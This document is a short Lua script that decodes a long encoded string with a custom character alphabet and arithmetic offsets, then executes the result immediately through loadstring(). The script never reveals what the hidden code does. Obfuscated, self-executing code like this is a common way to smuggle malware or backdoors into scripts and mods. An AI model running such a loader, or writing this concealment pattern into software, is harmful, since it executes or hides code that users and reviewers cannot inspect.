local Ue9Ex2kj="36RnKLbDjIWy0oUq5kB8tceSTuhvPCZFag1mpf4Aw927YElxGzdiVsMNHXOrJQ"
local bJ4oxyNqY2Dc="HRvn7nb3i3t6G6DR2RnnaR6Kk3r386b6z6xRZnvnL3G3t6f6Q6FR3RTRZn13R6P6C6qRORZnxn63g3KKg3B6RR9RLn1nMnx3o6N60R7R0R7nLKA3Q3G3Z62RWnpnunq3J3U343URHRTndno3HnL3m3O6CRbnSnLKP3s3T696569RknxnDK13X3c6KRvRLnPRznc3z3k3H6k6E65nGnL3Z3N3c6bRmRr6ZnEnS3M3D6H66RYRkn9R3K83b6k6G6qR6nknQnSnlnK6m6KRCRkn4nb3FnLKB6r6qR6nSnEnU3d3k693r6YRUngnJnq3x3a6Q6S6rR5nAn53g3t6v6jR7RnRYnbngnO3F626tRxRInzR33v3U6u6L69RNR4nrnh3J3v6i3T6QRDnqnTnu3W3p3f6H6LRAnZnan3Kh3h6T68R8RaRDnfnR3h6r6SRJRtnnKhnA386G6eRfRUndnWnA3j6p6X6ZRsRKnEn53N3D6A3b6f6"
local HpgzwE={}
local ypUrd=string.sub
local z6v0W=string.find
for lTIk=1,#bJ4oxyNqY2Dc,2 do
local nQB3=z6v0W(Ue9Ex2kj,ypUrd(bJ4oxyNqY2Dc,lTIk,lTIk),1,true)-1
local KbnM=z6v0W(Ue9Ex2kj,ypUrd(bJ4oxyNqY2Dc,lTIk+1,lTIk+1),1,true)-1
local iplL5=(nQB3+KbnM*62)
local dec = (iplL5 - 72 - ((lTIk-1)/2 * 30)) % 256
table.insert(HpgzwE,string.char(dec))
end
loadstring(table.concat(HpgzwE))()
